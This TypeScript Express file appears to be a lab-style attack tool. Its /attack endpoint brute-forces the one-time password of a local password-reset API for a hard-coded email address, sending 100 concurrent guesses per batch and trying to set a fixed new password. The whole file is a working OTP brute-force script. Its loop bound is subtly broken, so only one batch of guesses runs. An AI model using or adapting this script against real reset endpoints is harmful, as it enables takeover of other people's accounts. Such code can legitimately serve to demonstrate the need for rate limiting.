import express from "express";
import axios from "axios";
const app = express();
app.use(express.json());
async function request(index: string) {
  try {
    await axios.post("http://localhost:3001/reset-password", {
      email: "yashpate1@gmail.com",
      otp: index,
      newPassword: "Sos@12345",
    });

  } catch (e) {
    console.log(e)
  }
}

app.post("/attack", async () => {
  for (let index = 1; index < 6; index+=100) {
    const p = [];

    for (let j = 0; j < 100; j++) {
      p.push(request((index + j).toString()));
    }
    await Promise.all(p);
  }
});
app.listen(3000, () => {
  console.log("App RUning on port 3000");
});
